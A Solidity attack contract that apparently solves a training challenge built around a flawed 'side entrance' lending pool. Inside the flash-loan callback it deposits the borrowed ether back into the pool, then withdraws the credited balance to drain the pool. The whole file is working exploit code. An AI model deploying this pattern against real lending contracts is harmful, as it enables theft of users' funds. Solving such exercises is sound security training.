// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";

interface ISideEntranceLenderPool {
    function deposit() external payable;

    function withdraw() external;

    function flashLoan(uint256) external;
}

contract FlashLoanEtherReceiver {
    using Address for address payable;
    ISideEntranceLenderPool immutable pool;

    constructor(address _pool) {
        pool = ISideEntranceLenderPool(_pool);
    }

    receive() external payable {}

    function goFlash(uint256 _amount) external {
        pool.flashLoan(_amount);
    }

    function goWithdraw(address payable _beneficiary) external {
        pool.withdraw();
        _beneficiary.sendValue(address(this).balance);
    }

    function execute() external payable {
        pool.deposit{ value: msg.value }();
    }
}
